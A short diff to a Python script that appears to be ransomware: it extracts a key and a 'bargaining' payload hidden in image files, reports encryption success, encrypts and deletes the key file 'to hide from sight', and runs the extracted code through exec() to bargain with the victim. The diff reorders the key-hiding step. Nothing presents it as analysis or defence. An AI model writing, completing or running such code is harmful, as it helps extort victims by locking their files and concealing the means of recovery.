@@ -64,8 +64,12 @@ def main():
         key_found: bool = os.path.exists(image_containing_key)
         bargain_code_found: bool = os.path.exists(image_containing_bargaining_code)
         if key_found and bargain_code_found:
-            key: str = extract_file(image_containing_key, passphrase)
             code_to_bargain_with_user: str = extract_file(image_containing_bargaining_code, passphrase)
+            key: str = extract_file(image_containing_key, passphrase)
+
+            # Encrypts and removes the key from the working directory to hide from sight
+            encrypt_file("key.txt", key)
+            os.remove("key.txt")
         else:
             if not key_found and not bargain_code_found:
                 filler = f"{image_containing_key} and {image_containing_bargaining_code} don't"
@@ -103,13 +107,10 @@ def main():
 
     print("Encryption successful!")
 
-    # Encrypts and removes the key from the working directory to hide from sight
-    encrypt_file("key.txt", key)
-    os.remove("key.txt")
-
     # Runs the bargaining application
     exec("import bargain_with_user")
     exec(f"{code_to_bargain_with_user}")
 
 
 main()
+
